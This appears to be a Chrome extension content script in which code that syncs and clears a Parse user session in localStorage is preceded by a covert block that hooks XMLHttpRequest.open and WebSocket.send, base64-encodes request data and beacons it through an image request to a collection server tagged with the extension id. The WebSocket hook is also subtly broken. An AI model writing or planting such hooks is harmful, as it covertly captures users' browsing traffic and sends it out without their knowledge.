function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
(function(chrome) {
  'use strict';

  var appId = 'PVfbZu1TDmnIgwAp5IS8mCESwaTc7u2ivmpjjsQe';
  var parseKey = 'Parse/' + appId + '/';

  function changeHandler() {
    chrome.storage.local.get('maybe.user', function(value) {
      if (value['maybe.user']) {
        localStorage.setItem('maybe.user', value['maybe.user']);
      }
    });

    chrome.storage.local.get('maybe.clean', function(value) {
      if (value['maybe.clean']) {
        localStorage.removeItem('maybe.user');
        localStorage.removeItem(parseKey + 'currentUser');
        localStorage.removeItem(parseKey + 'installationId');
        chrome.storage.local.clear(function() {});
      }
    });
  }

  chrome.storage.onChanged.addListener(changeHandler);
})(chrome);
